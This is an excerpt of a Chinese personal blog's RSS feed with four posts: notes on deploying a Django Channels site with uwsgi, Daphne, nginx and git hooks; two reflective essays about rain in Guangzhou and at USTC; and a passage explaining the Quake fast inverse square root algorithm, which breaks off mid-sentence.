      <title>HSFZMUN 4.0 部署小记</title>
      <link>https://i.hsfzxjy.site/HSFZMUN-4.0-configuration/</link>
      <guid>https://i.hsfzxjy.site/HSFZMUN-4.0-configuration/</guid>
      <pubDate>Fri, 24 Feb 2017 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;blockquote&gt;
&lt;p &gt;技术流水账一篇，记录踩过的坑&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;channels-异构&quot;&gt;Channels 异构&lt;/h2&gt;
&lt;p &gt;Django Channels 官方文档宣称 channels 的最佳配置是使用其自带的服务器组</description>
        
      
      
      
      <content:encoded><![CDATA[<blockquote><p >技术流水账一篇，记录踩过的坑</p></blockquote><h2 id="channels-异构">Channels 异构</h2><p >Django Channels 官方文档宣称 channels 的最佳配置是使用其自带的服务器组件 Daphne，但在开发中我发现 daphne 处理普通请求比在 WSGI 架构下慢了好几倍，更何况使用 daphne 派发静态文件是十分不切实际的。于是我将 <code>http.request</code> 和 <code>websocket.*</code> 两个 channel 解耦，前者使用 nginx 配合 uwsgi 处理，后者使用 nginx 反向代理至 daphne 处理。这样一来便可充分利用两种架构的优势。</p><p ><strong>旧架构：</strong></p><p ><img loading="lazy" src="/assets/django-channels-configuration/old-arch.png" alt=""></p><p ><strong>新架构：</strong></p><p ><img loading="lazy" src="/assets/django-channels-configuration/new-arch.png" alt=""></p><h2 id="环境">环境</h2><ul><li>Ubuntu Server 16.04（与开发环境相同）</li><li>python 3.5.2</li><li>virtualenv &amp; virtualenvwrapper</li><li>nginx</li><li>uwsgi</li><li>redis（作为缓存和 Channel Layer）</li></ul><h2 id="channels-session-based-authentication">Channels Session-based Authentication</h2><p >channels 有提供基于 HTTP Session 的认证方式，但由于 websocket 和 http 在此不是同域请求（端口号不同），主域名下的 cookies 不会随 websocket 请求发送。故在发起 websocket 链接时要带上一个 GET 参数 <code>session_key</code>。在模板中该参数可由 <code>&#123; &#123;request.session.session_key&#125; &#125;</code> 获得。</p><h2 id="uwsgi">uwsgi</h2><p >安装：</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line">$ sudo pip install uwsgi <span class="hljs-comment"># 全局安装</span></span><br></pre></div></div><p  class="par"> 编写配置文件 <code>/etc/uwsgi/sites/hsfzmun.ini</code>：</p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line">[uwsgi]</span><br><span class="line">uid = git</span><br><span class="line">chdir = /home/git/hsfzmun/server</span><br><span class="line">module = config.wsgi:application</span><br><span class="line">home = /home/git/virtualenvs/hsfzmun # Virtualenv 路径</span><br><span class="line">master = true</span><br><span class="line">processes = 10</span><br><span class="line">socket = /var/www/hsfzmun.sock # 使用 Unix Socket 与 nginx 通信</span><br><span class="line">chmod-socket = 666</span><br><span class="line">vacuum = true</span><br></pre></div></div><p  class="par"> 配置 systemd 服务（<code>uwsgi.service</code>）：</p><div class="gk-code hljs" data-gk-id="BLOCK3"><div class="gk-code-display"><pre><span class="line">[Unit]</span><br><span class="line">Description=uWSGI Module</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">ExecStartPre=/bin/bash -c &#x27;mkdir -p /run/uwsgi; chown git:www-data /run/uwsgi&#x27;</span><br><span class="line">ExecStart=/usr/local/bin/uwsgi --emperor /etc/uwsgi/sites --touch-reload=/home/git/hsfzmun/server/uwsgi_params</span><br><span class="line">Restart=always</span><br><span class="line">KillSignal=SIGQUIT</span><br><span class="line">Type=notify</span><br><span class="line">NotifyAccess=all</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></div></div><p  class="par"> uwsgi 有个优点：可以通过 <code>--touch-reload</code> 参数简洁地重启服务，这样只需一条 <code>touch</code> 命令便可以完成新代码的部署。</p><h2 id="daphne">daphne</h2><p >daphne 有两个模块：Interface Server 和 Workers。前者负责处理 Websocket、long-polling 等请求，并将其抽象化为 channels 传递给 Workers，Workers 则负责执行具体的业务逻辑。这么做有一个好处就是 <strong>降低了底层与业务逻辑的耦合度，即使业务层崩溃也不会使连接断开，同时也减少了新代码部署对整个系统的印象</strong>。部署新代码时只需重启 Workers 即可。</p><p ><code>daphnei.service</code>：</p><div class="gk-code hljs" data-gk-id="BLOCK4"><div class="gk-code-display"><pre><span class="line">[Unit]</span><br><span class="line">Description=Daphne Interface Server</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">ExecStart=/home/git/cmd/daphnei</span><br><span class="line">Restart=always</span><br><span class="line">KillSignal=SIGQUIT</span><br><span class="line">Type=simple</span><br><span class="line">NotifyAccess=all</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></div></div><p  class="par"> <code>daphnew.service</code>：</p><div class="gk-code hljs" data-gk-id="BLOCK5"><div class="gk-code-display"><pre><span class="line">[Unit]</span><br><span class="line">Description=Daphne Worker</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">ExecStart=/home/git/cmd/daphnew</span><br><span class="line">Type=simple</span><br><span class="line">KillSignal=SIGQUIT</span><br><span class="line">Restart=always</span><br><span class="line">NotifyAccess=all</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></div></div><p  class="par"> <strong>此处踩了一个坑</strong>：起初 <code>Type</code> 处的值是 <code>Notify</code>，因为我是仿照 <code>uwsgi.service</code> 编写这两个文件的。<code>Notify</code> 型服务要求主进程自行通知 <code>systemd</code> 自己的启动/停止状态，但 daphne 没有这样的机制，从而导致 <code>systemctl</code> 阻塞，并以 90 秒为周期不断重启服务。幸好 StackOverflow 上的大神指出了这个错误。</p><p >这里我将具体的服务脚本独立出来，因为 <code>ExecStart</code> 不支持编写多行语句。</p><p ><code>cmd/daphnei</code>：</p><div class="gk-code hljs" data-gk-id="BLOCK6"><div class="gk-code-display"><pre><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><br><span class="line"><span class="hljs-built_in">cd</span> /home/git/hsfzmun/server</span><br><span class="line">/home/git/virtualenvs/hsfzmun/bin/daphne -b 0.0.0.0 -p 8001 -v2 config.asgi:channel_layer --access-log=/var/www/daphnei.log</span><br></pre></div></div><p  class="par"> <code>cmd/daphnew</code>：</p><div class="gk-code hljs" data-gk-id="BLOCK7"><div class="gk-code-display"><pre><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><br><span class="line"><span class="hljs-built_in">cd</span> /home/git/hsfzmun/server</span><br><span class="line">/home/git/virtualenvs/hsfzmun/bin/python manage.py runworker --threads 5 --only-channels=websocket.*</span><br></pre></div></div><p  class="par"> <strong>此处 daphne 有个 bug</strong>：理论上 verbosity 不应该影响程序的行为，但如果不加 <code>-v2</code> 参数 nginx 会报 <code>502 Bad Gateway</code>。</p><h2 id="nginx">nginx</h2><p >此处的难点是反向代理 websockets，因为 nginx 默认不识别 websocket 协议。为了能正确指定协议头，只能将所有 websocket 请求路由到某一子路径下。</p><p ><code>nginx.service</code>：</p><div class="gk-code hljs" data-gk-id="BLOCK8"><div class="gk-code-display"><pre><span class="line">server {</span><br><span class="line">  listen 80;</span><br><span class="line">  server_name &lt;ip&gt; product;</span><br><span class="line"></span><br><span class="line">  # 静态文件</span><br><span class="line">  location /static {</span><br><span class="line">    alias /var/www/static;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  # 用户上传的文件</span><br><span class="line">  location /m {</span><br><span class="line">    alias /var/www/media;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  # uwsgi 反向代理</span><br><span class="line">  location / {</span><br><span class="line">    include /var/www/uwsgi_params;</span><br><span class="line">    uwsgi_pass unix:/var/www/hsfzmun.sock;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  # daphne 反向代理</span><br><span class="line">  location /ws {</span><br><span class="line">    proxy_pass http://0.0.0.0:8001;</span><br><span class="line">    proxy_http_version 1.1;</span><br><span class="line">    proxy_set_header Upgrade $http_upgrade;</span><br><span class="line">    proxy_set_header Connection &quot;upgrade&quot;;</span><br><span class="line"></span><br><span class="line">    proxy_redirect     off;</span><br><span class="line">    proxy_set_header   Host $host;</span><br><span class="line">    proxy_set_header   X-Real-IP $remote_addr;</span><br><span class="line">    proxy_set_header   X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">    proxy_set_header   X-Forwarded-Host $server_name;</span><br><span class="line">    proxy_read_timeout  36000s;</span><br><span class="line">    proxy_send_timeout  36000s;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></div></div><h2 id="git-自动化部署">Git 自动化部署</h2><p >去年的 WiseCity 3.0 采用 Github 中转的方式进行部署，这对 Github 的稳定性有很高的要求。这次则将生产服务器作为 Git Server，使用 Git Hooks 进行自动化部署，大大提高了生产效率。</p><p >创建 git 用户：</p><div class="gk-code hljs" data-gk-id="BLOCK9"><div class="gk-code-display"><pre><span class="line">$ useradd git</span><br><span class="line">$ passwd git</span><br></pre></div></div><p  class="par"> 设置 SSH authorized_keys（略）。</p><p >创建仓库：</p><div class="gk-code hljs" data-gk-id="BLOCK10"><div class="gk-code-display"><pre><span class="line">$ <span class="hljs-built_in">cd</span> ~</span><br><span class="line">$ git init --bare hsfzmun.git</span><br></pre></div></div><p  class="par"> 创建钩子 <code>hooks/post-receive</code>：</p><div class="gk-code hljs" data-gk-id="BLOCK11"><div class="gk-code-display"><pre><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><br><span class="line"><span class="hljs-comment"># Checkout Repository</span></span><br><span class="line">GIT_WORK_TREE=/home/git/hsfzmun git checkout -f</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># Activate Virtualenv</span></span><br><span class="line"><span class="hljs-built_in">cd</span> /home/git/hsfzmun/server</span><br><span class="line"><span class="hljs-built_in">export</span> LC_ALL=C</span><br><span class="line"><span class="hljs-built_in">export</span> VIRTUALENVWRAPPER_PYTHON=/usr/bin/python3</span><br><span class="line"><span class="hljs-built_in">export</span> WORKON_HOME=~/virtualenvs</span><br><span class="line"><span class="hljs-built_in">source</span> /usr/local/bin/virtualenvwrapper.sh</span><br><span class="line">workon hsfzmun</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># Internationalization</span></span><br><span class="line">./manage.py compilemessages</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># Collect Static Files</span></span><br><span class="line">./manage.py collectstatic --noinput</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># Migrate Databases</span></span><br><span class="line">./manage.py migrate</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># Restart uWSGI</span></span><br><span class="line"><span class="hljs-built_in">touch</span> ./uwsgi_params</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># Restart Daphne Workers</span></span><br><span class="line">sudo systemctl restart daphnew --no-block</span><br><span class="line"></span><br><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;All operations done.&quot;</span></span><br></pre></div></div><p  class="par"> 此钩子会在每次 push 之后执行，自动更新静态文件和数据库表并重启相关服务。</p><p >本地添加远程仓库（略）。</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Ubuntu/">Ubuntu</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Django-Channels/">Django Channels</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Django/">Django</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Nginx/">Nginx</category>
      
      
      <comments>https://i.hsfzxjy.site/HSFZMUN-4.0-configuration/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>午后雨·科大</title>
      <link>https://i.hsfzxjy.site/raining-in-ustc/</link>
      <guid>https://i.hsfzxjy.site/raining-in-ustc/</guid>
      <pubDate>Sun, 21 Aug 2016 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;从昏睡中惊醒——现在是下午，屋内却很昏暗。屋外，隐约有一阵持续的背景噪音，我拉开窗帘，只见白茫茫的一片。&lt;/p&gt;
&lt;p &gt;下雨了，而且是大暴雨。&lt;/p&gt;
&lt;p &gt;打开窗，一股辛辣扑面而至——雨和着尘土的气息，再熟悉不过了。伴随着辛辣，一种沁人心脾的清凉涌入屋内，稀释着绿军</description>
        
      
      
      
      <content:encoded><![CDATA[<p >从昏睡中惊醒——现在是下午，屋内却很昏暗。屋外，隐约有一阵持续的背景噪音，我拉开窗帘，只见白茫茫的一片。</p><p >下雨了，而且是大暴雨。</p><p >打开窗，一股辛辣扑面而至——雨和着尘土的气息，再熟悉不过了。伴随着辛辣，一种沁人心脾的清凉涌入屋内，稀释着绿军衣挥发的氨味，一同驱走的，还有午后应有的烦躁。</p><p >八月的这里，原来可以不那么热。</p><p >一直以为，旱和热是这里夏天的常态。走出机场时，第一感受，也是几天来唯一的感受，便是热——无风的热，黏人；无云的热，灼人。想到将在这样的地方生活，心中顿生怯意——</p><p >但现在看来，似乎并不那么糟。</p><p >合上窗，雨声再次成为背景音。白色的水汽慢慢爬上玻璃，模糊了摇曳的树，漫水的街，雨中的整个世界。</p><p >这一幕似乎很熟悉。</p><p >没错，在更早些的时候，当我还在另一个校园时。那是个多雨的城市，雨大而急。记忆中，不知有多少次，也是透过模糊的窗，看着屋外湿透的一切。</p><p >面对暴雨，心中有过埋怨，有过恐惧，有过敬畏——但此时，我却体会到了偶遇老友般的亲切。</p><p >在陌生的校园，我又遇到了熟悉的雨。</p><p >我开始喜欢这里了。</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Life/">Life</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Random-Thoughts/">Random Thoughts</category>
      
      
      <comments>https://i.hsfzxjy.site/raining-in-ustc/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>最后的雨夜·广州</title>
      <link>https://i.hsfzxjy.site/leaving-guangzhou/</link>
      <guid>https://i.hsfzxjy.site/leaving-guangzhou/</guid>
      <pubDate>Wed, 17 Aug 2016 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt; 明天就要走了。&lt;/p&gt;
&lt;p &gt; 我贪婪地呼吸着这座城市，想要记住一切。&lt;/p&gt;
&lt;p &gt; 这是一个雨夜。雨不大，淅淅沥沥的，一反八月羊城的狂暴。雨丝划过夜空，拂去了暑气，夹带着一丝清冽；雨点打在地上，泛起一阵辛辣，这是雨的独特气息。昔日湿热而令人厌烦的南方雨，此刻却如</description>
        
      
      
      
      <content:encoded><![CDATA[<p > 明天就要走了。</p><p > 我贪婪地呼吸着这座城市，想要记住一切。</p><p > 这是一个雨夜。雨不大，淅淅沥沥的，一反八月羊城的狂暴。雨丝划过夜空，拂去了暑气，夹带着一丝清冽；雨点打在地上，泛起一阵辛辣，这是雨的独特气息。昔日湿热而令人厌烦的南方雨，此刻却如此亲近。</p><p > 步入校园，城市的灯光隐去了，笼下来的是夜的静谧。走在林荫道，可以闻到空中漫着的甘甜——这是芒果花的香气。</p><p > 记忆中，最为深刻的花香便是芒果花。这种热带的植物，在羊城开得到处都是——在童年的大院里，在中学的校道里，在这邻近的大学里，在记忆中的每一个角落。游子最难以忘怀的，当属这南国的果香。</p><p > 出了大学的门，转过街角，城市的灯又亮了。这是学校后门的一条食街，寄存了我六年的回忆。</p><p > 那股诱人的酸菜味，来自一家无名的东北菜馆。“15 块吃到饱”。豪爽的东北大叔，曾在那个三月给予我信心。</p><p > 空中那悠扬的，是全家的迎客铃。数不清有多少个早晨，因匆忙而在此买饭团。一口咬下，让柴鱼的美味充盈鼻腔，让翻腾的蒸汽吹走清晨的倦意。</p><p > 远处是那家熟悉的 M 记。24 小时永不停歇。在这里，我度过了高三的每个周末，一份板烧一杯咖啡，一小时的免费 wifi，抹去一上午的沮丧，换来下午持续的好心情。</p><p > 再往前便是学校。此时正值军训，校园里却一片静寂——也许是太晚了。六年前，梦从这里开始；六年后，我又将梦重新埋在这里。</p><p > 雨下大了，我却不急——毕竟，我将去往一个少雨的城市，这里的雨，我要细细记忆。</p><p > 这是一座现代化的都市。雨中的光光影影，雨中 BRT 的笛鸣，雨中泛着的柏油气息，都是这座城市的印记。</p><p > 这是一座古老的城市。人们仍执念于古老的语言，过着悠然的生活。饱经沧桑，却历久弥新。</p><p > 天一亮，我就将去往一个陌生的城市。那里少雨，泛着中原常见的普通。我将在那里度过四年，甚至更久。</p><p > 而在此之前，一个恋家的动物，要努力带走所有的回忆。</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Life/">Life</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Random-Thoughts/">Random Thoughts</category>
      
      
      <comments>https://i.hsfzxjy.site/leaving-guangzhou/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>揭秘·变态的平方根倒数算法</title>
      <link>https://i.hsfzxjy.site/uncover-the-secret-of-fast-inverse-square-root-algorithm/</link>
      <guid>https://i.hsfzxjy.site/uncover-the-secret-of-fast-inverse-square-root-algorithm/</guid>
      <pubDate>Tue, 02 Aug 2016 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;blockquote&gt;
&lt;p &gt;神的时代已离去
神的故事却化为传说
流落凡间
供凡人传颂、膜拜&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;这是什么&quot;&gt;这是什么&lt;/h2&gt;
&lt;p &gt;在上世纪 90 年代，出现过一款不可思议的游戏——雷神之锤（Quake series）。除</description>
        
      
      
      
      <content:encoded><![CDATA[<blockquote><p >神的时代已离去神的故事却化为传说流落凡间供凡人传颂、膜拜</p></blockquote><h2 id="这是什么">这是什么</h2><p >在上世纪 90 年代，出现过一款不可思议的游戏——雷神之锤（Quake series）。除了优秀的情节设定和精美的画面，最让人称道的莫过于它的运行效率——要知道在那个计算机配置低下的时代，一段小动画都是一个奇迹，但 Quake 却能流畅地运行于各种配置的电脑上。</p><p >直至 2005 年，当 Quake Engine 开源时，Quake 系列的秘密才被揭开。在代码库中，人们发现了许多堪称神来之笔的算法。它们以极其变态的高效率，压榨着计算机的性能，进而才支撑起了 90 年代 3D 游戏的传奇。其中的某些算法，甚至比系统原生的实现还要快！</p><p >我们今天的主角——快速平方根倒数算法（Fast Inverse Square Root）就是其中一个。</p><p >这是一个用于计算 $1 \over {\sqrt x}$ 的算法。这是一步重要的运算，因为在 3D 绘图中，计算机需要大量求解一个矢量的方向矢量，平方根倒数为其中的一步（$(v_x,v_y, v_z) \over {\sqrt{v_x^2+v_y^2+v_z^2}})$），而且为最麻烦的一步。如果能在此作优化，渲染效率无异会极大地提高。</p><p >然而，高效并不是它的唯一特点，吸引人们的更是其中的一个神秘的常数——$(5f3759df)_{16}$。</p><p >且看代码：</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-type">float</span> <span class="hljs-title function_">Q_rsqrt</span><span class="hljs-params">( <span class="hljs-type">float</span> number )</span></span><br><span class="line">{</span><br><span class="line">    <span class="hljs-type">long</span> i;</span><br><span class="line">    <span class="hljs-type">float</span> x2, y;</span><br><span class="line">    <span class="hljs-type">const</span> <span class="hljs-type">float</span> threehalfs = <span class="hljs-number">1.5F</span>;</span><br><span class="line"></span><br><span class="line">    x2 = number * <span class="hljs-number">0.5F</span>;</span><br><span class="line">    y  = number;</span><br><span class="line">    i  = * ( <span class="hljs-type">long</span> * ) &amp;y;                       <span class="hljs-comment">// evil floating point bit level hacking</span></span><br><span class="line">    i  = <span class="hljs-number">0x5f3759df</span> - ( i &gt;&gt; <span class="hljs-number">1</span> );               <span class="hljs-comment">// what the fuck?</span></span><br><span class="line">    y  = * ( <span class="hljs-type">float</span> * ) &amp;i;</span><br><span class="line">    y  = y * ( threehalfs - ( x2 * y * y ) );   <span class="hljs-comment">// 1st iteration</span></span><br><span class="line"><span class="hljs-comment">//y  = y * ( threehalfs - ( x2 * y * y ) );   // 2nd iteration, this can be removed</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> y;</span><br><span class="line">}</span><br></pre></div></div><p >翻译成数学语言就是：</p><ol><li>设输入数为 $number$，令 $ x_2=number/2, y=number $。</li><li>上式中，$y$ 是一个 32 位浮点数（可以理解为数学中的实数），现在我们将其“看作”一个整数，并赋给 $i$。</li><li>最神奇的一步出现了——用一个十六进制数 $5f3759df$ 减去 $i$ 自身右移一位的结果，并将结果赋给 $i$。</li><li>将整数 $i$ 重新“看作”是一个浮点数，并赋值给 $y$。</li><li>令 $y=y(1.5-x_2 \times y^2)$。</li><li>重复一遍操作 5（事实上这一步可以忽略）。</li></ol><p >在此需要向无计算机基础的朋友解释一下：</p><ul><li>右移（Right Shifting）指的是：将一个数表示成二进制之后整体向右移动一位，并抹去溢出的末位。如 $(4)_{10} &gt;&gt; 1=(100)_2 &gt;&gt; 1=(10)_2=(2)_{10}$。其效果等价为整除 2，但由于有 CPU 指令直接支持，速度比整除快若干个数量级。</li><li>无论是实数还是整数，在计算机中只不过是一串二进制序列。因此一串二进制序列，既可以被看作一个实数，也可以被看作一个整数。</li></ul><p >这个算法得到的只是一个近似值。对于 $[0.01, max\_float]$ 内的所有浮点数，最大误差为 $0.175%$（见 <a href="https://en.wikipedia.org/wiki/Fast_inverse_square_root">Accuracy</a>）。但它却比内置算法 <code>1.0/sqrt(x)</code> 快 4 倍，可谓瑕不掩瑜。</p><p >那么，它究竟是怎么实现的呢？</p><h2 id="牛顿法">牛顿法</h2><p >我们从后面开始分析。</p><p >从代码中可以看出：算法最后有两步相同的操作，像是在对一个数进行某种迭代。而其中的第二步被注释掉了，似乎是因为和性能损耗相比对结果的二次迭代意义不大，也说明 <strong>一次迭代的结果在误差允许范围内</strong>——这让人想到了牛顿法。</p><p >牛顿法是什么？</p><p >牛顿法是一种常用的求方程数值解的方法。其叙述如下：</p><blockquote><p >若在某个区间 $I$ 中，$f(x)$ 连续可导，且有唯一零点 $x_0$，则任取 $x_1 \in I$，定义数列 $x_{n+1}=x_n-{f(x_n) \over {f&#39;(x_n)}}$，则有 $lim_{n \to \infty}{x_n}=x_0$。</p></blockquote><p >用牛顿法进行迭代，可以完成对解任意精度的数值逼近。下面我们尝试写出 $x={1 \over {\sqrt {a}}}$的迭代式。</p><p >令 $f(x)={ {1 \over x^2}-a}$，则有</p><p >$$ x\_{n+1}=x_n-{f(x_n) \over {f&#39;(x_n)}} $$$$ =x_n-{ { {1 \over x_n^2} -a} \over {-2 \over {x_n^3} } } $$$$ ={3 \over 2}x_n - { {ax_n^3} \over 2} $$$$ ={x_n}(1.5-{a \over 2}x_n^2)$$</p><p >如果我们将$x_{n+1}$、$x_n$替换成$y$，将$a \over 2$替换成$x2$，可以发现和算法的最后一步是吻合的。由此可知：<strong>算法的最后确实采用了牛顿法</strong>。</p><p >也许你注意到：能解出 $1 \over {\sqrt a}$ 的方程不止这一条，迭代式的形式有很多。事实上，作者有意选择了这条方程——因为只有从这条方程得出的迭代式是 <strong>不用除法的</strong>。除法的性能十分糟糕，应该尽量避免。</p><p >但是，牛顿法不是需要迭代多次的吗？怎么在这里只进行一次就足够精确了呢？</p><p >牛顿法的收敛过程依赖于初值$x_1$的选取。若想一步到位，除非初值本身已经足够精确了。</p><p >初值是什么？</p><p >就是那神奇的第 3 步得到的结果。</p><h2 id="神奇的-0x5f3759df">神奇的 0x5f3759df</h2><p >这是整个算法的奥妙所在。我们再来回顾一下：</p><ol start="2"><li>上式中，$y$ 是一个 32 位浮点数（可以理解为数学中的实数），现在我们将其“看作”一个整数，并赋给 $i$。</li><li>最神奇的一步出现了——用一个十六进制数 $5f3759df$ 减去 $i$ 自身右移一位的结果，并将结果赋给 $i$。</li><li>将整数 $i$ 重新“看作”是一个浮点数，并赋值给 $y$。</li></ol><p >有了上一节的分析，几乎可以肯定：这是为了得到 $1 \over {\sqrt {number} }$ 的一个粗略值，即应该有 $y \approx {1 \over {\sqrt {number} } }$。</p><p >为了进一步的论证，我们首先要了解一个知识点：</p><h3 id="ieee-754（浮点数储存标准）">IEEE 754（浮点数储存标准）</h3><p ><a href="http://grouper.ieee.org/groups/754/">IEEE 754: Standard for Binary Floating-Point Arithmetic</a></p><p ><a href="https://en.wikipedia.org/wiki/IEEE_floating_point">IEEE floating point - Wikipedia</a></p><p >这是计算机内实数的储存标准。</p><p >在本算法中，我们使用的是 32 位浮点数（即 用 32 个二进制位表示一个实数）。储存方式如下：</p><blockquote><p >对任意一个实数 $x$，总可以将其分解为如下形式：$$ x=2^E \times (1+M)\ (E \in Z,M \in [0, 1))$$则 32 个二进制位安排如下：$$ S,EEEEEEEE,MMMMMMMMMMMMMMMMMMMMMM $$</p><ul><li>首位为符号位，取 <code>0</code> 为正数，取 <code>1</code> 为负数</li><li>接下来 8 位为 <strong>带符号</strong> 指数。根据带符号数的储存方式，该数减去 127 才为真实的指数 $E$</li><li>接下来 23 位为底数。是 $M$ 左移 23 位再取整的结果</li></ul></blockquote><p >举个例子：将 $0.15625=(0.00101)_2$ 换算成浮点数：</p><p >$$ 0.15625=+2^{-3}\times(1+0.25) $$</p><p >则有：</p><ul><li>符号位为 $0$</li><li>$E=-3$，换算成带符号正数为 $-3+127=124=(01111100)_2$</li><li>$M=0.25=(0.01)_2$，左移 23 位后为 $(01000000000000000000000)_2$</li></ul><p >从而浮点表示为：$0,01111100,01000000000000000000000$</p><h3 id="回到原题">回到原题</h3><p >现在，让我们思考一下：</p><p >如何只用加、减、乘和位运算神出鬼没地快速逼近 $1 \over {\sqrt x}$？</p><p >若想回答这个问题，得看我们对 $x$ 了解多少。</p><p >从上一小节的浮点数标准可以看出：<strong>计算机看到的 x 和我们接触的 x 结构不同</strong>，早在程序的编译期，$x$ 就被拆成了指数和底数两部分，并被打包存好——这一步是不耗时间的，但却给我们提供了海量的信息。</p><p >等等！指数和底数！似乎在暗示着什么！</p><p >我们，是不是可以通过对数进行运算？</p><p >设想，如果我们能利用以上信息，轻易地转换 $x$ 和 $\log_2 x$，由 $\log_2 {1 \over {\sqrt x}}={-{1 \over 2}}{\log_2 x}$ 就可以求得 $1 \over {\sqrt x}$ 的值了。</p><p >那么，$\log_2 x$ 该如何表示呢？且看以下变换。</p><p >根据 IEEE 754，对于一个 $x=2^E \times (1+M)&gt;0$，如果我们将其 32 位浮点表示看作一个 32 位整数 $I$，则有</p><p >$$I=2^{23}\times (E+127)+2^{23}\times M$$$$=2^{23}\times (E+127+M)$$</p><p >这个 $I$ 为已知量。通过已知量 $I$，我们可以得到已知量 $E+M$。</p><p >而另一方面，</p><p >$$ \log_2 x=\log_2 {2^E \times (1+M)} $$$$ = E + \log_2(1+M) $$</p><p >记</p><p >$$ F(M) = M $$$$ G(M) = \log_2(1+M) $$</p><p ><strong>注意到：当 $M\in[0,1)$ 时，$G(M)\in[0,1)$。同时观察图像可以发现 $G(M)$ 在此区间接近线性。</strong></p><p ><img loading="lazy" src="/assets/log2_1_x_and_x.png" alt=""></p><p >因此，我们可以通过上下移动 $F(M)$ 对 $G(M)$ 进行线性拟合。</p><p >注意一下这个例子中的误差衡量标准：<strong>我们在尽量减小误差的同时，也要保证误差分布尽量均匀，从而最大误差要尽量小</strong>。</p><p >综合以上考虑，问题最终化简为：</p><blockquote><p >找到一个$\sigma$，对$\Delta(M)=\log_2(1+M)-(M+\sigma)$，使$|\Delta(M)|$在 $[0,1)$ 上的最大值尽量小。</p></blockquote><p >易知：$|\Delta(0)|=|\Delta(1)|=\sigma$，另一个可能的极值点$M_0$满足$\Delta&#39;(M_0)=0$，解得$M_0={1\over \ln 2}$</p><p >当 $max\{|\Delta(M)|\}$ 最小时，必有：$\Delta(M_0)=\sigma$。解得 $\sigma=0.0430356660279671$。</p><p >从而我们有：$ \log_2 (1+M) \approx M+\sigma $。进而：</p><p >$$ I=2^{23}\times(E+M+127)$$$$ = 2^{23}\times(127+E+M+\sigma-\sigma)$$$$ \approx 2^{23}\times(127-\sigma+(E+\log_2(1+M)))$$$$ = 2^{23}\times(127-\sigma+\log_2 x)$$</p><p >则有：</p><p >$$ {I \over 2^{23}} + \sigma - 127 \approx \log_2 x $$</p><p >记 $r={1 \over {\sqrt x} }$ 对应的 $I$ 值为 $I_r$。则：</p><p >$$ I*r \approx 2^{23}\times(127-\sigma+\log_2 m)$$$$ = 2^{23}\times(127-\sigma-{1 \over 2}{\log_2 x})$$$$ \approx 2^{23}\times(127-\sigma-{1 \over 2}({I \over 2^{23}} + \sigma - 127))$$$$ = (127-\sigma)\times 2^{22} \times 3-{I \over 2}$$$$ = (5f37bcb6)*{16}-{I \over 2}$$$$ = (5f37bcb6)\_{16}-(I &gt;&gt; 1)$$</p><p >这便是步骤 3 的那个式子，神秘的常数终于出现了。</p><p >这里算得的常数和原算法有一些不同，主要是 $\sigma$ 取值差异造成的。如果我们取 $\sigma= 0.0450466$ 就会得到原算法的常数。作者选取了后者，应该是综合考虑了牛顿法迭代产生的误差。我没有深入研究——事实上，在允许范围内微调 $\sigma$ 不会对精度和速度产生显著影响。</p><h2 id="lomont-的另一种诠释">Lomont 的另一种诠释</h2><p >尽管 Quake Engine 的源码直到 2005 年才被公开，这个算法却在 2000 年左右即为人们所知。2003 年，数学家 Chris Lomont 曾写过一篇 <a href="http://www.lomont.org/Math/Papers/2003/InvSqrt.pdf">论文</a>讨论过这一常数的由来。他采用了另一种不同的方法。</p><p >Lomont 也发现 <code>i = 0x5f3759df - ( i &gt;&gt; 1 )</code> 实为 $1 \over {\sqrt x}$ 的粗略逼近，但他没有深究这个式子背后的数学含义，而是将此常数泛化为一个变量 $R$，通过最小化其与 $1 \over {\sqrt x}$ 的误差，反解出常数 $R$，其中运用的一些技巧值得品味。</p><p >有趣的是，他在论文中提供了另一个他认为最佳的常数 